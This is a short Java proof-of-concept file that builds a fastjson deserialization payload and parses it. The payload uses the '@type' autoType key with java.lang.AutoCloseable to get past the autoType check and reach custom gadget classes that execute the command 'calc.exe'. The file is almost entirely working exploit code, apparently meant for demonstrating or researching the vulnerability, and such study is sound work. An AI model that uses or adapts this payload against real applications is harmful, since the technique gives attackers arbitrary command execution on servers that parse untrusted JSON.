package org.heptagram.fastjson;

import com.alibaba.fastjson.JSONObject;

public class ExecRunnableMain {
    public static void main(String[] args) {
        String payload ="{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.ExecRunnable\",\n" +
                "  \"eval\":{\"@type\":\"org.heptagram.fastjson.EvalRunnable\",\"cmd\":\"calc.exe\"}\n" +
                "}";
        JSONObject.parseObject(payload);
    }
}
